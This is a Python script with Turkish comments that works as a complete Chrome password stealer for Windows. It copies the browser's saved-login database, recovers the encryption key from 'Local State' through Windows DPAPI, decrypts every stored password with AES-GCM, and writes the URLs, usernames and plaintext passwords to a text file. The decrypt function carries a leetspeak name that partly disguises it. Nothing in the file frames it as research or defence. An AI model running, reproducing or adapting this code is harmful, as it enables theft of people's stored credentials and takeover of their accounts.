import os
import shutil
import sqlite3
import json
import base64
from ctypes import windll, byref, create_string_buffer, Structure, c_ulong, c_void_p, POINTER, c_char
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Dosya yolları
login_data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
temp_login_data_path = os.path.join(os.path.expanduser('~'), 'Login Data_temp')
output_path = os.path.join(os.path.expanduser('~'), 'chrome_passwords.txt')
local_state_path = os.path.join(os.path.expanduser('~'), r'AppData\Local\Google\Chrome\User Data\Local State')

class DATA_BLOB(Structure):
    _fields_ = [("cbData", c_ulong), ("pbData", POINTER(c_char))]

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    """Şifrelenmiş veriyi çözer."""
    # Verileri uygun türlerdeki ctypes nesnelerine dönüştür
    encrypted_bytes_buffer = create_string_buffer(encrypted_bytes)
    entropy_buffer = create_string_buffer(entropy)
    blob_in = DATA_BLOB(len(encrypted_bytes), encrypted_bytes_buffer)
    blob_entropy = DATA_BLOB(len(entropy), entropy_buffer)
    blob_out = DATA_BLOB()

    # CryptUnprotectData işlevini çağır
    if not windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        error_code = windll.kernel32.GetLastError()
        error_message = create_string_buffer(1024)
        windll.kernel32.FormatMessageA(0x1000, None, error_code, 0, error_message, 1024, None)
        raise Exception(f"CryptUnprotectData çağrısı başarısız oldu. Hata kodu: {error_code}. Hata mesajı: {error_message.value.decode()}")
    else:
        # Şifrelenmiş veriyi çözer ve geri döner
        decrypted_data = create_string_buffer(blob_out.cbData)
        windll.kernel32.RtlMoveMemory(decrypted_data, blob_out.pbData, blob_out.cbData)  # RtlMoveMemory kullanımı
        return decrypted_data.raw

def get_master_key():
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = master_key[5:]  # Remove the DPAPI header
    return CryptUnprotectData(master_key)

def D3CrYP7V41U3(encrypted_bytes, master_key=None):
    """Decrypts a value (assuming raw byte data)."""
    if encrypted_bytes[:3] == b'v10' or encrypted_bytes[:3] == b'v11':
        iv = encrypted_bytes[3:15]
        payload = encrypted_bytes[15:-16]  # Remove the tag from the payload
        tag = encrypted_bytes[-16:]  # Extract the tag from the end of the payload
        cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_pass = decryptor.update(payload) + decryptor.finalize()
        
        return decrypted_pass.decode()
    return encrypted_bytes

def extract_chrome_passwords():
    """Google Chrome şifrelerini çıkarır."""
    if not os.path.exists(login_data_path):
        return "Google Chrome 'Login Data' dosyası bulunamadı."

    try:
        # Dosyanın bir kopyasını al
        shutil.copy2(login_data_path, temp_login_data_path)
        
        # Kopyalanan dosyayı aç
        conn = sqlite3.connect(temp_login_data_path)
        cursor = conn.cursor()

        cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
        rows = cursor.fetchall()

        master_key = get_master_key()

        with open(output_path, 'w', encoding='utf-8') as file:
            for row in rows:
                origin_url, action_url, username, encrypted_password = row
                try:
                    decrypted_password = D3CrYP7V41U3(encrypted_password, master_key)
                except Exception as e:
                    decrypted_password = f"Hata: {e}"
                
                file.write(f"URL: {origin_url}\nKullanıcı Adı: {username}\nŞifre: {decrypted_password}\n\n")
        
        conn.close()
        os.remove(temp_login_data_path)
        
        return f"Google Chrome şifreleri {output_path} dosyasına yazıldı."
    except Exception as e:
        return f"Şifreler okunamadı. Hata: {e}"

if __name__ == "__main__":
    result = extract_chrome_passwords()
    print(result)
